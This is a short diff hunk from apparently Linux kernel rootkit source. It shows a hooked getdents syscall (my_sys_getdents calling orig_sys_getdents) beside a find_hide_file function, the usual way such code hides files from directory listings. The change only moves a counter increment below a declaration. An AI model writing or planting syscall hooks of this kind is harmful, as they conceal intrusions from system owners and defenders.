@@ -35,8 +35,8 @@ int find_hide_file(char *name){
 }
 
 static long my_sys_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
-  r_count++;
   long retVal;
+  r_count++;
   retVal = orig_sys_getdents(fd, dirent, count);
   if(fd==3){
     unsigned long restLen;
